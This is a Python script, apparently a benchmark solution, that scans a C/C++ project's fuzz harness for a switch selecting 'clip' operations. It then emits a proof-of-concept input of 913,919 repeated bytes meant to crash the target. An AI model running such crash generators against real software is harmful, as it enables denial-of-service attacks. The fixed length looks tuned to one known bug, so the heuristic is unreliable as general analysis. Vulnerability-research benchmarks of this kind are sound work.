import os
import tarfile
import tempfile
import re


class Solution:
    def _extract_tar(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(tmpdir)
                return tmpdir
        except Exception:
            pass
        # If it's not a tarfile, assume it's a directory
        if os.path.isdir(src_path):
            return src_path
        return tmpdir

    def _find_clip_fuzzer(self, root: str):
        best = None
        # Scan source files for LLVMFuzzerTestOneInput and a switch that uses fuzz data to select clip ops
        for dirpath, _, filenames in os.walk(root):
            for filename in filenames:
                if not filename.endswith((".c", ".cc", ".cpp", ".cxx", ".C", ".c++", ".CPP")):
                    continue
                full_path = os.path.join(dirpath, filename)
                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception:
                    continue

                if "LLVMFuzzerTestOneInput" not in content:
                    continue

                for func_match in re.finditer(r"LLVMFuzzerTestOneInput\s*\(", content):
                    brace_start = content.find("{", func_match.end())
                    if brace_start == -1:
                        continue
                    depth = 0
                    i = brace_start
                    func_end = None
                    while i < len(content):
                        ch = content[i]
                        if ch == "{":
                            depth += 1
                        elif ch == "}":
                            depth -= 1
                            if depth == 0:
                                func_end = i + 1
                                break
                        i += 1
                    if func_end is None:
                        continue
                    body = content[brace_start:func_end]

                    search_pos = 0
                    while True:
                        switch_idx = body.find("switch", search_pos)
                        if switch_idx == -1:
                            break

                        paren_start = body.find("(", switch_idx)
                        if paren_start == -1:
                            break

                        depth2 = 0
                        j = paren_start
                        expr_end = None
                        while j < len(body):
                            ch = body[j]
                            if ch == "(":
                                depth2 += 1
                            elif ch == ")":
                                depth2 -= 1
                                if depth2 == 0:
                                    expr_end = j
                                    break
                            j += 1
                        if expr_end is None:
                            search_pos = switch_idx + 6
                            continue

                        expr = body[paren_start + 1 : expr_end]
                        expr_has_data = bool(re.search(r"\b(data|Data|buf|bytes|input|ptr)\b", expr))

                        kind = None
                        param = None

                        m_mod = re.search(r"%\s*(\d+)", expr)
                        if m_mod:
                            try:
                                val = int(m_mod.group(1))
                                if val > 0:
                                    kind = "mod"
                                    param = val
                            except ValueError:
                                pass
                        if kind is None:
                            m_and = re.search(r"&\s*(0x[0-9a-fA-F]+|\d+)", expr)
                            if m_and:
                                s_val = m_and.group(1)
                                try:
                                    if s_val.lower().startswith("0x"):
                                        val = int(s_val, 16)
                                    else:
                                        val = int(s_val)
                                    if val > 0:
                                        kind = "and"
                                        param = val
                                except ValueError:
                                    pass

                        if kind is None or param is None:
                            search_pos = expr_end
                            continue

                        brace2_start = body.find("{", expr_end)
                        if brace2_start == -1:
                            search_pos = expr_end
                            continue

                        depth3 = 0
                        k = brace2_start
                        brace2_end = None
                        while k < len(body):
                            ch2 = body[k]
                            if ch2 == "{":
                                depth3 += 1
                            elif ch2 == "}":
                                depth3 -= 1
                                if depth3 == 0:
                                    brace2_end = k + 1
                                    break
                            k += 1
                        if brace2_end is None:
                            search_pos = brace2_start + 1
                            continue

                        switch_body = body[brace2_start:brace2_end]
                        case_matches = list(re.finditer(r"\bcase\s+(\d+)\s*:", switch_body))
                        if not case_matches:
                            search_pos = brace2_end
                            continue

                        default_matches = list(re.finditer(r"\bdefault\s*:", switch_body))
                        label_matches = case_matches + default_matches
                        label_matches.sort(key=lambda m: m.start())

                        for cm in case_matches:
                            try:
                                case_val = int(cm.group(1))
                            except ValueError:
                                continue

                            label_start = cm.start()
                            code_start = cm.end()
                            idx_label = None
                            for idx_l, lab in enumerate(label_matches):
                                if lab.start() == label_start:
                                    idx_label = idx_l
                                    break
                            if idx_label is None:
                                continue
                            if idx_label + 1 < len(label_matches):
                                code_end = label_matches[idx_label + 1].start()
                            else:
                                code_end = len(switch_body)

                            snippet = switch_body[code_start:code_end]
                            snippet_lower = snippet.lower()
                            clip_count = snippet_lower.count("clip")
                            if clip_count <= 0:
                                continue

                            weight = 10 if expr_has_data else 1
                            score = clip_count * weight

                            candidate = {
                                "file": full_path,
                                "kind": kind,
                                "param": param,
                                "case_val": case_val,
                                "clip_count": clip_count,
                                "score": score,
                                "expr_has_data": expr_has_data,
                            }
                            if best is None or candidate["score"] > best["score"]:
                                best = candidate

                        search_pos = brace2_end

        return best

    def _byte_for_case(self, case_val: int, kind: str, param: int) -> int:
        for b in range(256):
            if kind == "mod":
                if param != 0 and b % param == case_val:
                    return b
            elif kind == "and":
                if b & param == case_val:
                    return b
        return case_val % 256

    def solve(self, src_path: str) -> bytes:
        root = self._extract_tar(src_path)
        info = self._find_clip_fuzzer(root)
        target_length = 913_919

        if info is not None:
            pattern_byte = self._byte_for_case(info["case_val"], info["kind"], info["param"])
            return bytes([pattern_byte]) * target_length

        # Fallback: generic large input; not tailored but maintains required length.
        return b"(" * target_length